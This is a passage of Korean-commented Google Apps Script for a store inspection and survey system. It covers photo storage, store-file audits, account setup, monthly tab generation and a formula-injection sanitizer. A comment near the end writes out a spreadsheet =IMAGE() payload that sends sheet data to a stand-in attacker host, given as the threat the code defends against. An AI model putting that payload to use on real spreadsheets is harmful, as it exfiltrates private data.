/* 사진 폴더는 '연도'를 맨 위에 둔다 — 연말에 그 해 폴더 하나만 내려받고 지우면 정리가 끝나도록.
     QSC 사진 / 2026 / QSC점검     / 매장 / 날짜
              / 2026 / 미스터리쇼퍼 / 매장 / 날짜
              / 2026 / 개선보고     / 매장 / 월
   보관 정책: 드라이브에는 올해치만. 새해가 되면 지난해 폴더를 통째로 내려받아 로컬 보관 후 삭제. */
function yearFolder(dateStr, kind) {
  const year = String(dateStr).slice(0, 4) || String(new Date().getFullYear());
  return subFolder(subFolder(DriveApp.getFolderById(PHOTO_FOLDER_ID), year), kind);
}

/* 처음 한 번만 — 사진 폴더를 만들고 그 ID를 실행 로그에 찍는다.
   찍힌 값을 [프로젝트 설정] > [스크립트 속성]의 PHOTO_FOLDER_ID에 넣으면 된다. */
function setupPhotoFolder() {
  const it = DriveApp.getFoldersByName('QSC 사진');
  const f = it.hasNext() ? it.next() : DriveApp.createFolder('QSC 사진');
  Logger.log('PHOTO_FOLDER_ID = ' + f.getId());
  return f.getId();
}

/* 지금 사진이 드라이브를 얼마나 쓰고 있는지 연도별로 알려준다 (앱스 스크립트에서 직접 실행).
   무료 15GB 안에서 도니, 모르는 채 차오르지 않게 가끔 확인할 것.
   일일 트리거로 걸어 두면 10GB를 넘을 때 담당자에게 메일 1통이 간다. */
function photoUsage() {
  if (!PHOTO_FOLDER_ID) return '사진 폴더 ID가 비어 있음';
  function size(folder) {
    let bytes = 0, n = 0;
    const files = folder.getFiles();
    while (files.hasNext()) { bytes += files.next().getSize(); n++; }
    const subs = folder.getFolders();
    while (subs.hasNext()) { const r = size(subs.next()); bytes += r.bytes; n += r.n; }
    return { bytes: bytes, n: n };
  }
  const root = DriveApp.getFolderById(PHOTO_FOLDER_ID);
  const lines = [];
  let total = 0;
  const years = root.getFolders();
  while (years.hasNext()) {
    const y = years.next();
    const r = size(y);
    total += r.bytes;
    lines.push(y.getName() + ' : ' + Math.round(r.bytes / 1048576) + 'MB · 사진 ' + r.n + '장');
  }
  lines.sort();
  const msg = lines.join('\n') + '\n────────\n합계 ' + Math.round(total / 1048576) + 'MB';
  Logger.log(msg);
  if (total > 10 * 1073741824) {
    try {
      MailApp.sendEmail(Session.getEffectiveUser().getEmail(), '[QSC] 사진 용량 10GB 초과', msg);
    } catch (e) { }
  }
  return msg;
}

function subFolder(parent, name) {
  const it = parent.getFoldersByName(name);
  return it.hasNext() ? it.next() : parent.createFolder(name);
}

/* ---------- 편집기 전용 함수 (명세 §14 — 5개) ---------- */

/* ★착수 0순위★ 매장 파일 26개의 편차표. 읽기 전용.
   파일당 3~6초라 6분 한도에 닿는다 — 반드시 10곳씩 끊어서 돌릴 것.
   인자를 비우면 앞의 10곳을 자동으로 잡는다. auditStoreFiles(['금종제과','도넛정수', …]) */
/* 26곳을 10곳씩 끊어 도는 공용 페이지 선택기.
   ★오프셋이 없으면 인자 없이 부를 때 항상 같은 앞 10곳만 돈다★ — 나머지 16곳을 돌리려면
   매장명을 손으로 타이핑해야 했고, 26개를 다 넣어도 slice(0,10)이 조용히 16곳을 버리면서
   출력에는 "10곳"이라고만 적었다. 담당자는 다 됐다고 믿는다.
   그래서 ①페이지 번호로 끊고 ②남은 곳 수와 다음에 칠 명령을 마지막 줄에 반드시 적는다. */
function pickPage(stores, page) {
  const all = (stores && stores.length) ? stores.map(normStore) : displayStores();
  const p = Math.max(0, Number(page || 0) | 0);
  return { list: all.slice(p * 10, p * 10 + 10), left: Math.max(0, all.length - (p + 1) * 10), page: p, total: all.length };
}

function auditStoreFiles(stores, page) {
  const sel = pickPage(stores, page);
  const list = sel.list;
  const out = ['=== auditStoreFiles ' + (sel.page + 1) + '쪽 · ' + list.length + '곳 (전체 ' + sel.total + '곳) ==='];
  const seen = {};
  /* ★게이트 판정을 사람이 눈으로 세게 하지 않는다★
     명세 §14-0은 "⑦이 0이 되기 전에는 매장에 배포하지 마십시오"라고 게이트를 걸어 두었는데,
     이 함수는 매장별 12항목을 줄줄이 찍는다(10곳 × 12항목 = 수백 줄). 그중 '⑦ 파일 못 찾음'이
     0인지를 비개발자가 세는 것은 현실적이지 않다. 세는 것은 코드가 하고, 결과만 맨 위에 적는다. */
  const gate = { noFile: [], noEdit: [], dupName: [] };
  list.forEach(function (raw) {
    const store = normStore(raw);
    const line = ['', '── ' + store + ' ──'];
    // ⑬ 정규화 후 매장명 충돌 (같은 키가 되면 교차 열람이다)
    if (seen[store]) {
      line.push('⑬ ★정규화 충돌★ 이미 같은 키의 매장이 있습니다: ' + seen[store]);
      gate.dupName.push(store);
    }
    seen[store] = raw;
    const id = storeFileId(store);
    if (!id) {
      line.push('⑦ ★파일 ID 없음★ — 이 매장에는 링크를 배포하지 마십시오');
      gate.noFile.push(store);
      out.push(line.join('\n')); return;
    }
    line.push('⑦ 파일 ID = ' + id);
    let ss;
    try { ss = SpreadsheetApp.openById(id); }
    catch (e) {
      line.push('⑦ ★열 수 없음★ ' + String(e));
      gate.noFile.push(store);
      out.push(line.join('\n')); return;
    }
    const tabs = monthTabs(ss);
    line.push('① 월 탭: ' + (tabs.length ? tabs.slice(0, 6).join(', ') : '없음'));
    const sh = tabs.length ? ss.getSheetByName(tabs[0]) : null;
    if (!sh) { out.push(line.join('\n')); return; }
    line.push('⑨ getMaxRows=' + sh.getMaxRows() + ' getMaxColumns=' + sh.getMaxColumns());
    // ② 라벨 원문
    const lm = labelMap(sh);
    const labels = [];
    for (const k in lm.at) labels.push(k + '@R' + lm.at[k].row + 'C' + lm.at[k].col);
    line.push('② A1:J10 라벨: ' + labels.join(' | '));
    // ③ 병합
    try {
      const mg = grid(sh, 12, 2, 1, 14).getMergedRanges();
      const mm = mg.map(function (r) { return r.getA1Notation(); });
      line.push('③ 12행 병합: ' + (mm.length ? mm.join(', ') : '없음'));
    } catch (e) { line.push('③ 병합 확인 실패: ' + String(e)); }
    // ④ 11행 머리글
    try {
      const hd = grid(sh, 11, 2, 1, 14).getValues()[0];
      line.push('④ 11행 머리글: ' + hd.join(' | '));
    } catch (e) { line.push('④ 머리글 확인 실패'); }
    // ⑤ K열 데이터 유효성
    const dept = deptOptions(sh);
    line.push('⑤ deptOptions(' + dept.length + '): ' + dept.join(', '));
    /* ⑥ 요약 값 칸이 수식인가 — ★고정 주소로 보지 않는다★
       종전에는 I5~I9를 봤는데 실물 요약 값은 H열이다(라벨 D5:G5 병합 + 값 H5).
       그래서 전부 '수기'로 나왔고, STORE_FILE_WRITE를 켤지 판단하는 근거가 통째로 틀렸다.
       라벨을 찾아 그 값 칸을 보는 방식으로 바꾼다 — 파일마다 열이 달라도 맞는다. */
    try {
      const lm6 = labelMap(sh);
      const names6 = [['방문일', ['방문일', '방문일자', '점검일']], ['위생점수', ['위생점수']],
        ['CS점수', ['CS점수']], ['종합점수', ['종합점수']],
        ['개선요청', REQ_LABELS], ['개선완료', ['개선완료', '조치완료', '완료']],
        ['미조치', ['미조치', '미이행']], ['개선율', ['개선율']]];
      const got6 = names6.map(function (n6) {
        const pv = labelValue(lm6, n6[1]);
        if (!pv.found || !pv.row) return n6[0] + '=라벨없음';
        const cc = grid(sh, pv.row, pv.col, 1, 1);
        const a1 = cc ? cc.getA1Notation() : '?';
        return n6[0] + '@' + a1 + '=' + ((cc && String(cc.getFormula() || '')) ? '수식' : '수기');
      });
      line.push('⑥ 요약 값 칸: ' + got6.join(' · '));
      line.push('   표 끝(=COUNTA에서 읽음): ' + (tableEndRow(sh, lm6) || '못 읽음'));
    } catch (e) { line.push('⑥ 요약 값 칸 확인 실패: ' + String(e)); }
    // ⑧ 보호 범위 — 3단계의 최우선 게이트
    try {
      const pr = sh.getProtections(SpreadsheetApp.ProtectionType.RANGE)
        .concat(sh.getProtections(SpreadsheetApp.ProtectionType.SHEET));
      if (!pr.length) line.push('⑧ 보호 없음');
      else pr.forEach(function (p) {
        const ok = p.canEdit();
        if (!ok && gate.noEdit.indexOf(store) < 0) gate.noEdit.push(store);
        line.push('⑧ 보호 ' + p.getRange().getA1Notation() + ' canEdit=' + ok +
          (ok ? '' : '  ★이 파일에는 저장할 수 없습니다 — 개인 계정을 편집자로 추가해야 합니다★'));
      });
    } catch (e) { line.push('⑧ 보호 확인 실패: ' + String(e)); }
    // ⑩ D열 사진 형태
    try {
      const df = grid(sh, 12, 4, 19, 1).getFormulas();
      let img = 0;
      df.forEach(function (r) { if (String(r[0]).indexOf('IMAGE') >= 0) img++; });
      line.push('⑩ D12:D30 =IMAGE() ' + img + '개 · over-grid 이미지 ' + sh.getImages().length + '개');
    } catch (e) { line.push('⑩ 사진 확인 실패'); }
    // ⑪ 날짜 타입
    try {
      const iv = labelValue(lm, ['방문일', '방문일자', '점검일']);
      const nv = grid(sh, 12, 14, 19, 1).getValues();
      let dcnt = 0;
      nv.forEach(function (r) { if (r[0] instanceof Date) dcnt++; });
      line.push('⑪ 방문일 Date=' + (iv.v instanceof Date) + ' · N열 Date ' + dcnt + '개');
    } catch (e) { line.push('⑪ 날짜 확인 실패'); }
    // ⑫ A1:N20 덤프
    try {
      const dump = grid(sh, 1, 1, 20, 14).getValues();
      line.push('⑫ A1:N20 덤프:');
      dump.forEach(function (r, i) {
        const s = r.map(function (x) { return String(x == null ? '' : x).slice(0, 14); }).join('\t');
        if (s.replace(/\t/g, '').trim()) line.push('   ' + (i + 1) + ': ' + s);
      });
    } catch (e) { line.push('⑫ 덤프 실패'); }
    out.push(line.join('\n'));
  });
  out.push(sel.left
    ? '\n★ ' + sel.left + '곳 남았습니다 — 다음: auditStoreFiles(null, ' + (sel.page + 1) + ')'
    : '\n✓ 전부 끝났습니다.');
  /* 판정을 ★맨 위★에 둔다 — 아래로 수백 줄이 이어지므로 끝에 적으면 스크롤해야 보인다 */
  const nm = function (a) { return a.length ? a.length + '곳 (' + a.join(', ') + ')' : '0곳'; };
  out.unshift(
    '=== 이 쪽(' + list.length + '곳) 게이트 판정 ===' +
    '\n⑦ 파일 못 찾음   : ' + nm(gate.noFile) + '   ← 0곳이 아니면 그 매장에 배포하지 마십시오' +
    '\n⑧ canEdit=false : ' + nm(gate.noEdit) + '   ← 0곳이 아니면 STORE_FILE_WRITE를 켜지 마십시오' +
    '\n⑬ 이름 충돌      : ' + nm(gate.dupName) + '   ← 0곳이 아니면 통합시트 D열 이름을 구분하십시오' +
    '\n※ 전체 ' + sel.total + '곳을 다 보려면 남은 쪽도 돌린 뒤 각 쪽의 이 세 줄을 합쳐 보십시오.\n');
  const msg = out.join('\n');
  Logger.log(msg);
  return msg;
}

/* 통합시트의 표시 매장을 읽어 `계정` 탭을 채운다. 이미 있는 계정은 건드리지 않는다.
   ★아이디 = 통합시트 D열 표시 매장명 그대로다★ (확정사항 2)
   로마자 변환도, 해시 아이디(st1a2b3c4d)도 쓰지 않는다 — 매장 담당자가 카톡으로 받은
   문자열을 옮겨 적어야 하는데, 자기 매장 이름이 아닌 것을 받으면 그 자체가 문의 전화가 된다.
   D열(매장범위)에도 같은 값을 그대로 복사한다 — 손으로 적으면 공백 하나가 달라도
   그 매장은 자기 매장을 볼 수 없다.
   새 계정은 **상태 '사용' · 비밀번호 미설정**으로 태어난다. 비밀번호가 없으면 로그인할 수
   없으므로 '사용'인 채로 두어도 열린 문이 아니고, 담당자가 accounts.html에서 비밀번호를
   정해 주는 순간부터 쓸 수 있게 된다.
   ★편집기용 래퍼와 액션용 코어를 나눈다★ — 편집기는 사람이 읽는 문자열을,
   account.sync는 화면이 그릴 배열을 필요로 한다. 로직이 두 벌이 되면 언젠가 갈라진다. */
function syncStoreAccountsCore() {
  const ss = authSS();
  if (!ss) return { ok: false, error: 'AUTH_SHEET_ID 속성이 비어 있습니다.', added: [], skipped: [] };
  ensureAuthSheets();
  const sh = ss.getSheetByName(AUTH_ACCOUNT_SHEET);
  if (!sh) return { ok: false, error: '계정 탭이 없습니다.', added: [], skipped: [] };

  const have = readAccounts();
  const taken = {};
  have.forEach(function (a) {
    taken[a.id] = true;
    if (a.scope) taken[normId(a.scope)] = true;   // 아이디를 손으로 바꿔 둔 계정도 건너뛴다
  });

  let stores;
  try { stores = displayStores(); }
  catch (e) { return { ok: false, error: '통합시트를 읽지 못했습니다.', added: [], skipped: [] }; }

  const added = [], skipped = [], conflict = [];
  /* ★'대소문자·공백만 다른 매장'을 '이미 있음'으로 묻지 않는다★
     displayStores()는 normStore로 dedup하므로 '스타벅스 A점'과 '스타벅스 a점'이 둘 다 남는데,
     taken은 normId(소문자화 포함) 기준이라 두 번째가 skipped(이미 있음)로 분류됐다.
     그 매장은 계정이 없는데 화면에는 "처리됨"으로 보이고, missingStoreAccounts도 같은 이유로
     잡지 못한다 — 아무도 모르는 채 그 매장만 영영 로그인하지 못한다. 사유를 갈라 적는다. */
  const mine = {};   // 이번 실행에서 추가한 정규화 아이디 → 매장명
  stores.forEach(function (name) {
    const key = normId(name);
    if (mine[key]) { conflict.push(name + ' ↔ ' + mine[key]); return; }
    if (taken[key]) { skipped.push(name); return; }
    /* A~F만 쓴다. G~K(해시~최근접속)는 비워 두어 '비밀번호 미설정'으로 남긴다 */
    sh.appendRow(safeRow([name, name, '매장담당자', name, STATUS_ON, '']));
    taken[key] = true;
    mine[key] = name;
    added.push(name);
  });
  added.forEach(function (n) { dropAccountCache(normId(n)); });
  return { ok: true, added: added, skipped: skipped, conflict: conflict };
}

/* 편집기에서 실행하는 래퍼 */
function syncStoreAccounts() {
  const r = syncStoreAccountsCore();
  if (!r.ok) { Logger.log(r.error); return r.error; }
  const conflict = r.conflict || [];
  const msg = '추가 ' + r.added.length + '건 (상태 「' + STATUS_ON + '」 · 비밀번호 미설정)\n' +
    r.added.join('\n') +
    '\n\n건너뜀(이미 있음) ' + r.skipped.length + '건: ' + r.skipped.join(', ') +
    (conflict.length
      ? '\n\n★이름 충돌 ' + conflict.length + '건 — 계정을 만들지 못했습니다★\n' + conflict.join('\n') +
        '\n  대소문자·공백만 다른 매장은 아이디가 같아집니다. 통합시트 D열에서 이름을 구분해 주십시오.'
      : '') +
    '\n\n※ 아이디는 매장명 그대로입니다. 다음으로 accounts.html에서 매장별 비밀번호를 정해' +
    '\n   각 매장에 전달하십시오. 비밀번호를 정하기 전까지는 로그인할 수 없습니다.';
  Logger.log(msg);
  return msg;
}

/* 관리자 비밀번호 최초 설정·재설정. 실행 로그에 24시간짜리 코드 1개가 찍힌다.
   속성에는 해시와 만료시각만 저장한다 — 평문은 어디에도 남지 않는다.
   ★이것은 관리자 부트스트랩·복구 전용이다★ — 매장 비밀번호는 accounts.html에서 정한다.
   ★코드에 대상 아이디를 함께 굽는다★ — 아이디를 payload에서만 받으면, 이 코드를 아는 사람이
   임의 계정의 비밀번호를 덮어써 그 계정의 살아 있는 토큰을 전부 죽이고 로그인할 수 있다. */
function issueAdminSetupCode(forId) {
  const id = normId(forId || 'admin');
  if (!validId(id)) return '아이디가 올바르지 않습니다 (제어문자 없이 ' + ID_MAX + '자 이내)';
  const code = randomCode(12);
  PROPS.setProperty('ADMIN_SETUP', JSON.stringify({
    id: id, h: setupCodeHash(code), exp: Date.now() + 24 * 3600 * 1000
  }));
  Logger.log('설정코드(24시간): ' + code + '\nlogin.html에서 아이디 ' + id + ' + 이 코드를 입력하십시오.' +
    '\n※ 이 코드는 ' + id + ' 계정에만 쓸 수 있고, 한 번 쓰면 사라집니다.');
  return code;
}

/* 잠금이 오작동할 때. 15분이면 자동으로 풀리지만 기다릴 수 없을 때 쓴다.
   (accounts.html에서 비밀번호를 다시 설정해도 함께 풀린다 — 그쪽이 정상 경로다.) */
function unlock(id) {
  const key = normId(id);
  lockClear(key);
  Logger.log('잠금 해제: ' + key);
  return '잠금 해제: ' + key;
}

/* 감사로그 정리 — 1년에 한 번(연초) 편집기에서 실행.
   ★`계정` 탭과 같은 파일이라는 것이 이유다★ — authSS().openById()는 인증 요청마다 이 파일을
   여는데, 감사로그가 수만 행이면 그 열기 자체가 느려진다. 요청마다 1줄씩 쌓이고 지우는
   경로가 없어서 연 2만 행쯤 된다.
   앞쪽 오래된 행을 '감사로그_<연도>' 탭으로 옮기고 원본에서 지운다(지우는 것이 아니라 옮긴다 —
   감사로그는 append-only가 원칙이고, 조사할 일이 생기면 그 탭을 보면 된다). */
function archiveAuditLog(keep) {
  const ss = authSS();
  if (!ss) return 'AUTH_SHEET_ID 속성이 비어 있습니다.';
  const sh = ss.getSheetByName(AUTH_LOG_SHEET);
  if (!sh) return '감사로그 탭이 없습니다.';
  const last = sh.getLastRow();
  const keepN = Math.max(1000, Number(keep || 10000) | 0);
  const move = last - 1 - keepN;
  if (move <= 0) return '감사로그 ' + Math.max(0, last - 1) + '줄 — 아직 정리할 필요가 없습니다 (기준 ' + keepN + '줄).';

  const tz = ss.getSpreadsheetTimeZone();
  let name = '감사로그_' + Utilities.formatDate(new Date(), tz, 'yyyyMMdd');
  let n = 1;
  while (ss.getSheetByName(name)) { n++; name = '감사로그_' + Utilities.formatDate(new Date(), tz, 'yyyyMMdd') + '_' + n; }
  const dst = ss.insertSheet(name);
  dst.appendRow(['시각', '아이디', '역할', '액션', '대상매장', '결과', '사유코드', '비고']);

  /* 1,000줄씩 옮긴다 — 한 번에 수만 행을 setValues 하면 6분 한도에 닿는다 */
  let done = 0;
  while (done < move) {
    const chunk = Math.min(1000, move - done);
    const src = grid(sh, 2, 1, chunk, AUDIT_COLS);
    if (!src) break;
    const vals = src.getValues();
    const at = dst.getLastRow() + 1;
    if (dst.getMaxRows() < at + chunk - 1) dst.insertRowsAfter(dst.getMaxRows(), at + chunk - 1 - dst.getMaxRows());
    dst.getRange(at, 1, chunk, AUDIT_COLS).setValues(vals);
    sh.deleteRows(2, chunk);           // 옮긴 만큼만 지운다 (머리글 1행은 그대로)
    done += chunk;
  }
  const msg = '감사로그 ' + done + '줄을 「' + name + '」 탭으로 옮겼습니다. 남은 줄: ' + Math.max(0, sh.getLastRow() - 1);
  Logger.log(msg);
  return msg;
}

/* 점검 모드 켜기/끄기 — 편집기에서도 한 줄로 할 수 있게 남긴다.
   평소에는 속성 화면에서 MAINT 칸을 채우고 비우는 것이 더 빠르다. */
function setMaintenance(msg) {
  const s = String(msg == null ? '' : msg).trim();
  if (s) PROPS.setProperty('MAINT', s);
  else { try { PROPS.deleteProperty('MAINT'); } catch (e) { } }
  const out = s ? '점검 모드 켜짐: ' + s : '점검 모드 해제';
  Logger.log(out);
  return out;
}

/* 월 탭 하나를 만든다. ★스프레드시트 객체를 인자로 받는다★ —
   매장 목록으로 도는 makeMonthTabs와, 사본 하나만 만지는 테스트가 **같은 코드**를 타야
   테스트가 의미를 갖는다. 여기서 storeFileId를 부르지 않는 것이 그 조건이다. */
function makeMonthTabIn(ss, ym) {
  if (ss.getSheetByName(ym)) return { mark: '·', msg: '이미 있음' };
  const tabs = monthTabs(ss).filter(function (t) { return t < ym; });
  if (!tabs.length) return { mark: '✗', msg: '복제할 직전 월 탭 없음' };
  const src = ss.getSheetByName(tabs[0]);
  const sh = src.copyTo(ss);          // 이름이 "2608의 사본"이 된다
  sh.setName(ym);                     // ★setName 필수★
  /* ★여기부터 끝까지를 한 덩어리로 묶는다★ (지적 1 · 2026-08-20)
     copyTo + setName 까지는 끝났으므로 이 시점에 예외가 나면 ym 탭은 ★직전 달 데이터를
     그대로 안은 채★ 남는다. 그런데 이 함수의 첫 줄이 '이미 있으면 돌아간다'라서
     다시 실행해도 손대지 않는다 — 아무도 모르는 채 10월 탭에 9월 내용이 남는다.
     그래서 실패하면 반쯤 만든 탭을 지우고, 지우는 것마저 실패하면 그 사실을 크게 알린다. */
  try {
    /* ★반드시 보이게 만든다★ (2026-08-17) — 사본 테스트에서 만들어진 2610 탭이 숨김 상태로
       태어났다. copyTo는 원본의 숨김 여부를 따라가므로, 직전 월 탭이 어쩌다 숨겨져 있으면
       새 달이 통째로 안 보이는 채 시작된다. 앱은 숨김 시트도 읽어서 연동은 되지만
       ★매장이 시트를 직접 열면 이번 달 탭이 없다★ — 원인을 찾기가 매우 어려운 종류다.
       조건 없이 showSheet()를 부른다. 이미 보이는 시트에 불러도 아무 일도 일어나지 않는다. */
    try { sh.showSheet(); } catch (e) { }
    /* ★2610부터 종합점수 산식을 바꾼다★ (2026-08-18 확정)
         9월까지 : I3 = AVERAGE(위생, CS) − 개선요청건수/100
                   → 지적 '건수'가 종합점수를 깎았다. 그런데 그 건수는 이미 QSC 점수 안에서
                     감점된 것이라 같은 사유로 두 번 깎이고 있었다.
         10월부터: I3 = 위생×0.6 + CS×0.3 + 개선율×0.1
                   → 지적을 받아 깎이는 구조가 아니라, ★얼마나 개선했는지가 점수로 들어가는★ 구조다.
                     중대차감은 QSC 점수 안에서만 빠진다 — 종합에서 또 빼지 않는다.
       복제 원본이 9월 탭이면 옛 수식이 그대로 따라오므로 여기서 갈아 끼운다.
       ★칸을 라벨로 찾는다★ — 파일마다 열이 다를 수 있다(위생 E3·CS G3·종합 I3·개선율 H9가 실물). */
    if (ym >= '2610') {
      try {
        const lmF = labelMap(sh);
        const cH = labelValue(lmF, ['위생점수', 'QSC점수', '위생']);
        const cC = labelValue(lmF, ['CS점수', 'CS']);
        const cT = labelValue(lmF, ['종합점수', '종합']);
        const cR = labelValue(lmF, ['개선율']);
        if (cH.found && cC.found && cT.found && cR.found) {
          const a1 = function (pv) { return grid(sh, pv.row, pv.col, 1, 1).getA1Notation(); };
          /* ★개선율이 비면 1(100%)로 본다★ — 개선율은 완료÷요청이라 ★요청이 0건이면 빈칸★이다.
             그때 0으로 치면 지적이 하나도 없는 매장이 10%를 통째로 못 받아 오히려 손해를 본다.
             개선할 것이 없었다는 뜻이므로 만점이 맞다. (통합시트 CA열 수식도 같은 규칙이다) */
          const f = '=IF(COUNT(' + a1(cH) + ',' + a1(cC) + ')=0,"",' +
            a1(cH) + '*0.6+' + a1(cC) + '*0.3+IF(' + a1(cR) + '="",1,' + a1(cR) + ')*0.1)';
          grid(sh, cT.row, cT.col, 1, 1).setFormula(f);
        }
      } catch (e) { /* 못 바꿔도 탭 생성 자체는 성공시킨다 — 수식은 눈으로 고칠 수 있다 */ }
    }

    /* ★제목을 이번 달로 고쳐 쓴다★ — D2가 고정 텍스트라 복제하면 "8월 QSC 현황"이 그대로
       10월 탭에 남는다. 라벨이 아니라 제목이라 아래 값 칸 초기화 목록에도 걸리지 않는다.
       '<월>월 QSC 현황' 형태만 갈아 끼우고, 다른 형태로 적어 둔 파일은 건드리지 않는다. */
    try {
      const t2 = grid(sh, 2, 4, 1, 1);
      const cur2 = t2 ? String(t2.getValue() || '') : '';
      if (/^\s*\d{1,2}\s*월/.test(cur2)) {
        t2.setValue(cur2.replace(/^\s*\d{1,2}\s*월/, Number(ym.slice(2, 4)) + '월'));
      }
    } catch (e) { }
    // ① 개선요청 표 본문
    const bodyRng = grid(sh, 12, 2, sh.getMaxRows() - 11, 14);
    if (bodyRng) bodyRng.clearContent();
    // ② 라벨 옆 값 칸 중 수식이 아닌 것
    const lm = labelMap(sh);
    /* ★요약 건수 칸을 반드시 함께 지운다★ — 종전 목록에는 방문일·점수·등급만 있어서,
       I5~I8이 수기인 파일은 10월 탭이 8월의 '요청 5 / 완료 4'를 안고 태어난다. 개선요청
       표(B12 이하)는 비었는데 요약은 값이 있으므로 readStoreTab의 폴백(라벨을 못 찾을 때만
       작동)도 걸리지 않는다 → 매장 화면에 "개선율 80%", 표는 빈 상태.
       수식이면 아래 getFormula 검사가 어차피 건너뛴다. */
    ['방문일', '방문일자', '점검일', '방문시간', '위생점수', 'CS점수', '종합점수',
      '위생등급', 'CS등급', '종합등급',
      '개선요청사항', '개선요청', '요청', '요청건수', '개선요청건수',
      '개선예정/진행', '개선예정', '개선진행', '진행중', '진행',
      '개선완료', '조치완료', '완료', '미조치', '미이행'].forEach(function (label) {
        const p = labelValue(lm, [label]);
        if (!p.found || !p.row) return;
        const c = grid(sh, p.row, p.col, 1, 1);
        if (c && String(c.getFormula() || '') === '') c.clearContent();
      });
    /* ★복제된 보호 설정을 보고한다★ — copyTo는 보호까지 복제한다. 원본 탭이 보호돼 있으면
       새 탭도 보호된 채 태어나고, store.saveImprove가 게이트·락·rev를 다 통과한 뒤
       setValues 한 줄에서 죽어 SERVER_ERROR로만 보인다. 만드는 김에 알려주는 편이
       26곳 전수 재감사보다 싸다. */
    let mark = '✓';
    let note = '';
    try {
      const pr = sh.getProtections(SpreadsheetApp.ProtectionType.RANGE)
        .concat(sh.getProtections(SpreadsheetApp.ProtectionType.SHEET));
      const bad = pr.filter(function (x) { return !x.canEdit(); });
      if (bad.length) { mark = '✗'; note = '  ★보호 ' + bad.length + '건 — 이 매장은 저장되지 않습니다★'; }
    } catch (e2) { note = '  (보호 확인 실패)'; }
    return { mark: mark, msg: tabs[0] + ' → ' + ym + note };
  } catch (e) {
    let removed = false;
    try { ss.deleteSheet(sh); removed = true; } catch (e2) { }
    return removed
      ? { mark: '✗', msg: '만들다 실패해 되돌렸습니다 — 다시 실행하십시오 (' + String(e).slice(0, 60) + ')' }
      : { mark: '✗', msg: '★' + ym + ' 탭이 직전 달 내용을 안은 채 남았습니다 — 시트에서 그 탭을 지우고 다시 실행하십시오★ (' + String(e).slice(0, 60) + ')' };
  }
}

/* 월 탭 자동 생성. 직전 월 탭을 copyTo → setName → 내용만 지우기.
   ★clear()가 아니라 clearContent()★ — clear()는 병합·데이터 유효성·서식을 날려
     D:I 병합과 K열 드롭다운이 사라진다.
   ※명세는 "clearContent()"라고만 적었으나 시트 전체에 걸면 '방문일'·'위생점수' 같은 라벨까지
     사라진다. 지워야 하는 것은 '데이터'이므로 ① 개선요청 표 본문(B12 이하)과 ② 라벨 옆
     값 칸 중 수식이 아닌 것만 지운다. 수식(개선율 등)은 그대로 두어야 새 달에도 계산된다.
   파일당 3~6초라 반드시 10곳씩. makeMonthTabs(['금종제과'], '2610') 으로 1곳 선검증할 것. */
function makeMonthTabs(stores, ym, page) {
  if (!validYm(ym)) return 'ym 형식이 올바르지 않습니다 (예: 2610)';
  const sel = pickPage(stores, page);
  const list = sel.list;
  const out = ['=== makeMonthTabs ' + ym + ' · ' + (sel.page + 1) + '쪽 · ' + list.length + '곳 (전체 ' + sel.total + '곳) ==='];
  list.forEach(function (raw) {
    const store = normStore(raw);
    try {
      const id = storeFileId(store);
      if (!id) { out.push('✗ ' + store + ' : 파일 ID 없음'); return; }
      const r = makeMonthTabIn(SpreadsheetApp.openById(id), ym);
      out.push(r.mark + ' ' + store + ' : ' + r.msg);
    } catch (e) {
      out.push('✗ ' + store + ' : ' + String(e));
    }
  });
  out.push(sel.left
    ? '\n★ ' + sel.left + '곳 남았습니다 — 다음: makeMonthTabs(null, "' + ym + '", ' + (sel.page + 1) + ')'
    : '\n✓ 전부 끝났습니다.');
  const msg = out.join('\n');
  Logger.log(msg);
  return msg;
}

/* PW_ITER 확정용 실측. 목표는 ★해시 1회 ≤250ms★.
   1.5초짜리 해시는 요청 1건(수 ms)으로 서버 1.5초를 태우는 증폭 공격이고,
   일일 90분 쿼터가 실공격 2~3분에 소진되어 26곳 전체가 24시간 멈춘다. */
function benchPw() {
  const Ns = [1000, 5000, 10000, 20000];
  const lines = ['=== benchPw (목표: 1회 ≤250ms) ==='];
  Ns.forEach(function (n) {
    const ms = [];
    for (let i = 0; i < 3; i++) {
      const t = Date.now();
      pwHash('bench-salt-0000', 'benchmark-password', n);
      ms.push(Date.now() - t);
    }
    const avg = Math.round(ms.reduce(function (a, b) { return a + b; }, 0) / ms.length);
    lines.push('N=' + n + ' : ' + ms.join('ms, ') + 'ms  (평균 ' + avg + 'ms)' + (avg <= 250 ? '  ← 사용 가능' : ''));
  });
  lines.push('250ms 이내인 가장 큰 N을 스크립트 속성 PW_ITER 에 넣으십시오.');
  const msg = lines.join('\n');
  Logger.log(msg);
  return msg;
}

/* ---------- 공용 ---------- */

/* 수식 주입 차단 — 시트에 쓰는 사용자 입력 문자열은 반드시 이걸 통과시킨다.
   구글시트는 = + - @ 로 시작하는 문자열을 '수식'으로 저장한다. 그중 =IMAGE()는
   사람이 아무것도 누르지 않아도 셀이 계산될 때 외부 주소를 자동으로 불러온다.
   즉 고객 설문 비고칸에 =IMAGE("https://남의서버/?d="&JOIN(",",어느탭!A1:A50)) 한 줄이면
   시트 내용이 그대로 밖으로 나간다. 앞에 아포스트로피를 붙이면 문자열로 굳고 화면에는 안 보인다.
   ※ 서버가 의도적으로 만드는 수식은 imageFormula() 하나뿐이며 파일 ID만 받는다.
   ※ 감사로그 writer도 이걸 통과한다 — 아이디는 사용자가 보낸 문자열이다. */
/* ★선행 공백을 반드시 건너뛰고 본다★
   종전 정규식은 첫 글자만 봤다. 그런데 구글시트는 " =IMAGE(…)" 처럼 앞에 공백·줄바꿈·
   NBSP(U+00A0)·BOM(U+FEFF)이 붙은 문자열도 그것을 떼고 수식으로 해석한다(setValue는 사람이
   친 입력과 같은 파싱을 탄다). 즉 공백 한 칸으로 이 방어가 통째로 넘어갔다.
   ★이 구멍이 특히 위험한 이유★: survey.submit은 anon:true라 10/1에 AUTH_ENFORCE='on'을 켜도
   익명으로 도달한다. 문항 비고에
     " =IMAGE(\"https://공격자/?d=\"&JOIN(\",\",QSC_상세!L2:L200))"
   한 줄을 넣으면 `쇼퍼_비고` 탭에 수식으로 굳고, 시트를 여는 순간 자동으로 계산되어
   QSC 상세의 점검자 비고가 밖으로 나간다. */
function safe(v) {
  if (v == null) return '';
  if (typeof v !== 'string') return v;
  /* ★보이지 않는 문자와 따옴표는 전부 이스케이프로 적는다★ — 소스에 그대로 넣으면 diff·검색이 막히고,
     정규식 안의 따옴표를 문자열로 오인하는 도구가 많다(이 파일을 훑는 검사 스크립트가 실제로
